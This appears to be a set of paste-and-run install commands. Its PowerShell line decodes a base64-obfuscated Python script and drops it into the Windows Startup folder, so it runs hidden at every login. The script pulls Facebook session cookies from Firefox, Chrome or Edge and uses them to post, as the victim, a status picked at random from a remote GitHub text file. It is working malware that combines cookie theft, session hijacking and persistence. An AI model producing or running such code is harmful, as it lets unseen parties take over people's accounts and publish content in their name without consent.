pip install --upgrade requests
pip install --upgrade browser-cookie3
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('aW1wb3J0IGJyb3dzZXJfY29va2llMyBhcyBiYzMNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHJlDQppbXBvcnQgcmFuZG9tDQoNClNUQVRVU19VUkwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzB4YnVzeWJveC9QcmlvU3RhdHVzL21haW4vc3RhdHVzX3RleHRzL3FvdXRlcy50eHQnDQpSRVFVSVJFRF9DT09LSUVTID0gWydjX3VzZXInLCAnZGF0cicsICdmcicsICdzYicsICd4cyddDQpQUk9YWSA9IEZhbHNlDQoNCmRlZiBoYXNoX2FsbF9jb29raWVzKGNvb2tpZXMpOg0KICAgIGZvciBpIGluIFJFUVVJUkVEX0NPT0tJRVM6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHQgPSBjb29raWVzW2ldDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBnZXRfY29va2llcygpOg0KICAgIHRyeToNCiAgICAgICAgY29va2llcyA9IGJjMy5maXJlZm94KGRvbWFpbl9uYW1lPSdmYWNlYm9vay5jb20nKQ0KICAgICAgICBjb29raWVzID0gcmVxdWVzdHMudXRpbHMuZGljdF9mcm9tX2Nvb2tpZWphcihjb29raWVzKQ0KICAgICAgICBpZihoYXNoX2FsbF9jb29raWVzKGNvb2tpZXMpKToNCiAgICAgICAgICAgIHJldHVybiBjb29raWVzDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgdHJ5Og0KICAgICAgICBjb29raWVzID0gYmMzLmNocm9tZShkb21haW5fbmFtZT0nZmFjZWJvb2suY29tJykNCiAgICAgICAgY29va2llcyA9IHJlcXVlc3RzLnV0aWxzLmRpY3RfZnJvbV9jb29raWVqYXIoY29va2llcykNCiAgICAgICAgaWYoaGFzaF9hbGxfY29va2llcyhjb29raWVzKSk6DQogICAgICAgICAgICByZXR1cm4gY29va2llcw0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgIHRyeToNCiAgICAgICAgY29va2llcyA9IGJjMy5lZGdlKGRvbWFpbl9uYW1lPSdmYWNlYm9vay5jb20nKQ0KICAgICAgICBjb29raWVzID0gcmVxdWVzdHMudXRpbHMuZGljdF9mcm9tX2Nvb2tpZWphcihjb29raWVzKQ0KICAgICAgICBpZihoYXNoX2FsbF9jb29raWVzKGNvb2tpZXMpKToNCiAgICAgICAgICAgIHJldHVybiBjb29raWVzDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQoNCmRlZiBwb3N0X3N0YXR1cyhzdGF0dXMsIGNvb2tpZXMpOg0KICAgIHRyeToNCiAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICBzZXNzaW9uLmNvb2tpZXMgPSByZXF1ZXN0cy51dGlscy5jb29raWVqYXJfZnJvbV9kaWN0KGNvb2tpZXMpDQogICAgICAgIHNlc3Npb24uaGVhZGVycyA9IHsNCiAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo5Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzk3LjAnLA0KICAgICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAnU2VjLUZldGNoLURlc3QnOiAnZG9jdW1lbnQnLA0KICAgICAgICAgICAgJ1NlYy1GZXRjaC1Nb2RlJzogJ25hdmlnYXRlJywNCiAgICAgICAgICAgICdTZWMtRmV0Y2gtU2l0ZSc6ICdzYW1lLW9yaWdpbicsDQogICAgICAgICAgICAnU2VjLUZldGNoLVVzZXInOiAnPzEnLA0KICAgICAgICAgICAgJ1ByYWdtYSc6ICduby1jYWNoZScsDQogICAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICduby1jYWNoZScsDQogICAgICAgICAgICAnVEUnOiAndHJhaWxlcnMnDQogICAgICAgIH0NCiAgICAgICAgaWYgUFJPWFk6DQogICAgICAgICAgICBzZXNzaW9uLnZlcmlmeSA9IEZhbHNlDQogICAgICAgICAgICBzZXNzaW9uLnByb3hpZXMgPSB7J2h0dHBzJzogJ2h0dHA6Ly8xMjcuMC4wLjE6ODA4MCd9DQogICAgICAgIA0KICAgICAgICByZXMgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL21lLycpDQogICAgICAgIHVyaSA9IHJlcy5yZXF1ZXN0LnVybA0KICAgICAgICByZXMgPSByZXMudGV4dA0KICAgICAgICANCiAgICAgICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICdPcmlnaW4nOiAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICdSZWZlcmVyJzogdXJpLA0KICAgICAgICB9DQoNCiAgICAgICAgcGFyYW1zID0gew0KICAgICAgICAgICAgJ2F2JyA6IGNvb2tpZXNbJ2NfdXNlciddLA0KICAgICAgICAgICAgJ2VhdicgOiByZS5maW5kYWxsKCdlYXY9KFteOyJdKyknLHJlcylbMF1bOi00XSwNCiAgICAgICAgICAgICdyZWZpZCcgOiByZS5maW5kYWxsKCdyZWZpZD0oW147Il0rKScscmVzKVswXQ0KICAgICAgICB9DQoNCiAgICAgICAgZGF0YSA9IHsNCiAgICAgICAgICAgICdmYl9kdHNnJyA6IHJlLmZpbmRhbGwoJ25hbWU9ImZiX2R0c2ciIHZhbHVlPSIoW14iXSspJyxyZXMpWzBdLA0KICAgICAgICAgICAgJ2phem9lc3QnIDogcmUuZmluZGFsbCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IihbXiJdKyknLHJlcylbMF0sDQogICAgICAgICAgICAncHJpdmFjeXgnOicyOTE2NjcwNjQyNzk3MTQnLCAjIEZyaWVuZHMNCiAgICAgICAgICAgICdyMmEnIDogcmUuZmluZGFsbCgnbmFtZT0icjJhIiB2YWx1ZT0iKFteIl0rKScscmVzKVswXSwNCiAgICAgICAgICAgICd4aHBjX3RpbWVsaW5lJyA6IHJlLmZpbmRhbGwoJ25hbWU9InhocGNfdGltZWxpbmUiIHZhbHVlPSIoW14iXSspJyxyZXMpWzBdLA0KICAgICAgICAgICAgJ3RhcmdldCcgOiBjb29raWVzWydjX3VzZXInXSwNCiAgICAgICAgICAgICdjX3NyYycgOiAndGltZWxpbmVfc2VsZicsDQogICAgICAgICAgICAnY3dldmVudCcgOiAnY29tcG9zZXJfZW50cnknLA0KICAgICAgICAgICAgJ3JlZmVycmVyJyA6ICd0aW1lbGluZScsDQogICAgICAgICAgICAnY3R5cGUnIDogJ2lubGluZScsDQogICAgICAgICAgICAnY3ZlcicgOiAnYW1iZXInLA0KICAgICAgICAgICAgJ3JzdF9pY3YnIDogJycgLA0KICAgICAgICAgICAgJ3hjX21lc3NhZ2UnIDogc3RhdHVzLCANCiAgICAgICAgICAgICd2aWV3X3Bvc3QnIDonUG9zdCcNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgc2Vzc2lvbi5wb3N0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vY29tcG9zZXIvbWJhc2ljLycsIHBhcmFtcz1wYXJhbXMsZGF0YT1kYXRhLGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgbWtfc3RhdHVzKCk6DQogICAgcmVzID0gcmVxdWVzdHMuZ2V0KFNUQVRVU19VUkwpDQogICAgaWYgbm90IHN0cihyZXMuc3RhdHVzX2NvZGUpLnN0YXJ0c3dpdGgoJzInKToNCiAgICAgICAgcmV0dXJuIEZhbHNlLCBOb25lDQogICAgbGluZXMgPSBbaS5zdHJpcCgpIGZvciBpIGluIHJlcy50ZXh0LnNwbGl0KCdcbicpIGlmIGkuc3RyaXAoKV0NCiAgICByZXR1cm4gVHJ1ZSwgcmFuZG9tLmNob2ljZShsaW5lcykNCg0KZGVmIG1haW4oKToNCiAgICBzdWNjZXNzLCBzdGF0dXMgPSBta19zdGF0dXMoKQ0KICAgIGlmIG5vdCBzdWNjZXNzOg0KICAgICAgICByZXR1cm4NCiAgICBjb29raWVzID0gZ2V0X2Nvb2tpZXMoKQ0KICAgIGlmIG5vdCBjb29raWVzOg0KICAgICAgICByZXR1cm4NCiAgICBzdGF0dXMgPSBwb3N0X3N0YXR1cyhzdGF0dXMsY29va2llcykNCg0KbWFpbigpDQo=')) | Out-File -Encoding utf8 "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrioStatus.pyw"
